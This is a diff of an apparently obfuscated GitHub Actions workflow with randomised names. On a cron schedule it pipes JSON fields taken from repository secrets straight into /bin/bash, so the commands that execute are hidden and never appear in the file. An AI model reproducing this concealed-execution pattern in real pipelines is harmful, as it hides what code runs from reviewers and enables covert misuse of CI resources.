@@ -1,28 +1,27 @@
 name: nongyuanhui7654
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 3/6 * * *'
-
+    - cron: '55 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: nongyuanhui7654
         env:
-          aezaz1: ${{ secrets.aezaz1 }}
+          mk46522: ${{ secrets.mk46522 }}
         run: |
-          echo $aezaz1 | jq -r .acq93 | /bin/bash
-          echo $lqv6583 | jq -r .rrri0 | /bin/bash
-          echo $po0 | jq -r .eshrj83 | /bin/bash
-          echo $ykn1 | jq -r .pf48416 | /bin/bash
-          echo $dsrvz0243 | jq -r .yog61 | /bin/bash
-          echo $dndku513 | jq -r .st72 | /bin/bash
-          echo $nufpn83079 | jq -r .afx5 | /bin/bash
-          echo $zbie89 | jq -r .vsn1489 | /bin/bash
-          echo $paw2 | jq -r .u9 | /bin/bash
-          echo $h07792 | jq -r .mztl1180 | /bin/bash
-          echo $wje0 | jq -r .wk588 | /bin/bash
-          echo $wfxxf1 | jq -r .inuwb03 | /bin/bash
+          echo $mk46522 | jq -r .bnnxh68770 | /bin/bash
+          echo $hqmvr75 | jq -r .uqfeh451 | /bin/bash
+          echo $qribc95093 | jq -r .cxou5675 | /bin/bash
+          echo $vqbv23986 | jq -r .t8769 | /bin/bash
+          echo $u51298 | jq -r .f928 | /bin/bash
+          echo $fk767 | jq -r .lgx5538 | /bin/bash
+          echo $uqo1 | jq -r .lucw3 | /bin/bash
+          echo $qb918 | jq -r .qmlxw72 | /bin/bash
+          echo $uyi496 | jq -r .egh6214 | /bin/bash
+          echo $kl66 | jq -r .yxbb7610 | /bin/bash
 
